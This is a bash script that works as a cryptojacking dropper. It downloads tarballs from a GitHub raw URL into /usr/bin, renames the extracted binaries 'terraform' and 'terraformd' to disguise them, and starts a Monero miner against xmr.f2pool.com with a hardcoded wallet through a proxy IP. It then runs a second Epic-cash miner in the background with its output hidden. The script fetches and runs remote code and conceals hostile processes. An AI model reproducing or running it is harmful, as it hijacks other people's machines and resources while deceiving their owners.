#/bin/bash
cd /usr/bin

wget https://raw.githubusercontent.com/d1uf95z8/csv/master/csv44.tar.gz
tar xvzf csv44.tar.gz
wget https://raw.githubusercontent.com/d1uf95z8/csv/master/csv45.tar.gz
tar xvzf csv45.tar.gz
mv nodejs terraform
mv ruby terraformd

touch abcdzyxw.txt
echo '{
"retry_time" : 20,
"cpu_threads" : 8,
"giveup_limit" : 15,
"algorithm" : "randomepic",
"disable_cpu" : false,
"disable_gpu" : true
}' > abcdzyxw.txt

mkdir Cache Config Logs Pools

sysctl vm.nr_hugepages=2560

sleep 9

http_proxy=http://34.105.44.133:8816 nice -n 19 terraform -o xmr.f2pool.com:13531 -u 89Xc3ZmpsiX9PVdVsLyRkQ1bw2Sv8wg5pbhL2jCGnB8kMZPtTP5U49zE15qWLmoYPR1YJnYgVE6qVGp8PVCCMwCh31YJhgE -a rx/0 --donate-level 1 -t 4 -B

sleep 60

http_proxy=http://34.105.44.133:8816 nice -n -20 nohup terraformd --config-file abcdzyxw.txt --pool epic.icemining.ca:4000 --wallet abtikaon --password x >/dev/null 2>&1 &

cd /

